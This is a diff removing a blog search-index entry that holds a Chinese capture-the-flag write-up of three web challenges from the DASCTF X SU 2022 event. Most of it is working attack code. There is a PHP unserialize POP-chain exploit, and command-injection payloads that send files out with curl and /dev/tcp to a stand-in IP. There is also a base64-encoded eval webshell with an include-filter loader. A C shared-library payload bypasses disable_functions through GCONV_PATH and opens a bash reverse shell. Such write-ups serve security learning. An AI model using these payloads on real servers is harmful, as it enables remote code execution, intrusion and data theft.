@@ -186,124 +186,6 @@
       </tags>
   </entry>
   <entry>
-    <title>DASCTF X SU 三月春季挑战赛 web</title>
-    <url>/2022/04/13/%5BDASCTF-SU%5Dall-web/</url>
-    <content><![CDATA[<h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1><span id="more"></span>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">v1</span>(<span class="variable">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1-&gt;<span class="title function_ invoke__">world</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="variable language_">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>热身题 链子如下</p>
-<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">fin::__destruct</span><br><span class="line">what::__toString</span><br><span class="line">mix::run</span><br><span class="line">crow::__invoke</span><br><span class="line">fin::__call</span><br><span class="line">mix::get_flag</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$w</span> = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$m1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$f2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$m2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span>-&gt;f1 = <span class="variable">$w</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;a = <span class="variable">$m1</span>;</span><br><span class="line"><span class="variable">$m1</span>-&gt;m1 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;v1 = <span class="variable">$f2</span>;</span><br><span class="line"><span class="variable">$f2</span>-&gt;f1 = <span class="variable">$m2</span>;</span><br><span class="line"><span class="variable">$m2</span>-&gt;m1=<span class="string">&quot;?&gt;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$f1</span>);</span><br></pre></td></tr></table></figure>
-
-<p>命令执行点注意闭合前面的<code>&lt;?php</code>标签绕过<code>#</code>注释符的说。</p>
-<p><img src="/images/BUU/20220412221927.png"></p>
-<p>这么多文件，小孩子才做选择，大人全都要</p>
-<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">$m2-&gt;m1=&quot;?&gt;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat *&#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;;</span></span><br></pre></td></tr></table></figure>
-
-<p>藏在注释里的flag</p>
-<p><img src="/images/BUU/20220412222531.png"></p>
-<h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>题目贴心地给出了源码附件呢</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)  </span><br></pre></td></tr></table></figure>
-
-<p>最开始以为是ssti，只是上了个有亿点狠的waf</p>
-<p>手动测试了常见的payload后感觉<code>eval()</code>应该是重伤倒地了，得找找还有没有其它命令执行点的说。</p>
-<p>正好下面还有个<code>os.system()</code>，相当于</p>
-<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">time</span> ip &#123;payload&#125; &gt; ./tmp/<span class="built_in">log</span>.txt</span><br></pre></td></tr></table></figure>
-
-<p>waf把<code>;</code> <code>&amp;</code>都过滤了，截断不能（瘫</p>
-<p>但其实截不截断的都无所谓啦，只要我们想执行的代码能跑就行，因此还是比较容易想到套娃式处理命令的反引号的。</p>
-<p>这里我最开始以自己对重定向的理解试了试不用<code>&amp;</code>构造一个野鸡版反弹shell，均以失败告终（悲</p>
-<p>其中的迷惑操作包括但不限于</p>
-<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>#`bash%<span class="number">20</span>-i%<span class="number">200</span>&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/233.33.3.333/</span><span class="number">2333</span>%<span class="number">201</span>&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/233.33.3.333/</span><span class="number">2333</span>`</span><br></pre></td></tr></table></figure>
-
-<p><del>（学习中 求轻喷）</del></p>
-<p>说实话一直对重定向的<code>&amp;</code>符似懂非懂 越往下挖越接近底层实现了 挖了个陨石坑属于是</p>
-<p>所以就改成分步执行命令了</p>
-<p>直接写命令的话会在<code>eval()</code>处报错而跳过<code>os.system()</code>，因此用<code>#</code>注释符注释掉要执行的命令，待绕过waf后它仍会正常跑的。</p>
-<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>#`whoami&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/233.33.3.333/</span><span class="number">2333</span>`</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/BUU/20220413172345.png"></p>
-<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>#`ls&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/233.33.3.333/</span><span class="number">2333</span>`</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/BUU/20220413151334.png"></p>
-<p>把flag存进<code>./tmp/log.txt</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">1#</span><span class="language-bash">`<span class="built_in">cat</span>%20T*`</span></span><br></pre></td></tr></table></figure>
-
-<p>再利用<code>curl</code>把<code>./tmp/log.txt</code>带出来</p>
-<blockquote>
-<p>-F参数用来向服务器上传二进制文件。</p>
-<p>$ curl -F ‘file=@photo.png’ <a href="http://233.33.3.333">http://233.33.3.333</a></p>
-<p>上面命令会给 HTTP 请求加上标头Content-Type: multipart/form-data，然后将文件photo.png作为file字段上传。</p>
-</blockquote>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>#`curl%<span class="number">20</span>-F%<span class="number">20</span>flag=@tmp/log.txt%<span class="number">20</span>http://<span class="number">233.33.3.333:2333</span>`</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/BUU/20220413203858.png"></p>
-<h1 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h1><p>上传综合题，挺久没做了的说，生疏了好多（悲</p>
-<p><img src="/images/BUU/20220412135630.png"></p>
-<p>要求文件后缀为.php，这题不对劲，危</p>
-<p>上传个pureshell逝逝</p>
-<p><img src="/images/BUU/20220412140609.png"></p>
-<p>可恶，你发现了甚么</p>
-<p>得收集更多信息才行，phpinfo看一下</p>
-<p><img src="/images/BUU/20220412141143.png"></p>
-<p>成功上传，感谢出题师傅放行</p>
-<p>啊哈哈哈哈<strong>disable_functions</strong>来咯（悲</p>
-<p><img src="/images/BUU/20220412141602.png"></p>
-<p>哭完还得上路，试试能不能把后端源码抓出来</p>
-<p><code>highlight_file()</code>被禁了，而同类型的<code>show_source()</code>并没有出现在<strong>disable_functions</strong>里</p>
-<p><img src="/images/BUU/20220412143440.png"></p>
-<p>可恶，又被发现了</p>
-<p><code>base64_decode()</code>一下看能不能绕过</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;c2hvd19zb3VyY2U=&#x27;</span>))(<span class="string">&#x27;../index.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>成功拿到waf源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fun</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>由于<code>strstr()</code>对大小写敏感，这里的blacklist只需用大小写就能绕过了。</p>
-<p>接下来写webshell</p>
-<p>先上传一个文件<strong>s1.php</strong>，一句话的<code>$</code>被过滤了，因此base64编码</p>
-<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">PD9waHAgZXZhbCgkX1BPU1RbJ3NoJ10pOz8+</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"># </span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sh&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>再上传第二个文件<strong>s2.php</strong>去解码<strong>s1.php</strong>的内容并包含，<code>-</code>被过滤了，也得编码一部分再解回来</p>
-<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">Include</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT1lMTQxM2MwN2MyYzRjODc2ZTYwMTVhMzUwMjM0OGQzMC5waHA=&quot;</span>));<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"># </span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">Include</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=e1413c07c2c4c876e6015a3502348d30.php&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>利用文件包含特性和伪协议达到写webshell的目的，太棒了</p>
-<p><img src="/images/BUU/20220412154256.png"></p>
-<p>这时试图用蚁剑直接连接却失败了，应该是<strong>disable_functions</strong>里把蚁剑使用的函数也都禁用了，看来出题师傅想教给我们的还有更多呢。</p>
-<p><a href="https://blog.csdn.net/qq_42303523/article/details/117911859">使用GCONV_PATH与iconv进行bypass disable_functions</a></p>
-<p>使用这种更接近底层的绕过手段的前提就是要做到任意文件上传，于是乎对照题目的前后端手动构造了一个没有waf的上传页面的源码<strong>s3.php</strong></p>
-<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">PGRpdiBjbGFzcz0ibGlnaHQiPjxzcGFuIGNsYXNzPSJnbG93Ij48Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9InBvc3QiPui1nue+juWkqumYs++8gTxpbnB1dCBjbGFzcz0iaW5wdXRfZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0idXBsb2FkX2ZpbGUiLz48aW5wdXQgY2xhc3M9ImJ1dHRvbiIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJ1cGxvYWQiLz48L2Zvcm0+PC9zcGFuPjxzcGFuIGNsYXNzPSJmbGFyZSI+PC9zcGFuPjxkaXY+PD9waHAgbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VwbG9hZF9maWxlJ11bJ3RtcF9uYW1lJ10sIi90bXAvIi4kX0ZJTEVTWyd1cGxvYWRfZmlsZSddWyduYW1lJ10pOz8+</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"># <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;light&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;glow&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span>赞美太阳！<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;input_file&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;flare&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="string">&quot;/tmp/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>编码进行绕过，再复制一份之前的<strong>s2.php</strong>更名为<strong>s4.php</strong>作为上传点，包含文件换成<strong>s3.php</strong>就好。</p>
-<p>下面制作exp所需文件</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv_init</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/233.33.3.333/2333 &lt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译成<strong>so</strong>文件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc exp.c -o exp.so -shared -fPIC</span><br></pre></td></tr></table></figure>
-
-<p>书写<strong>gconv-modules</strong>文件</p>
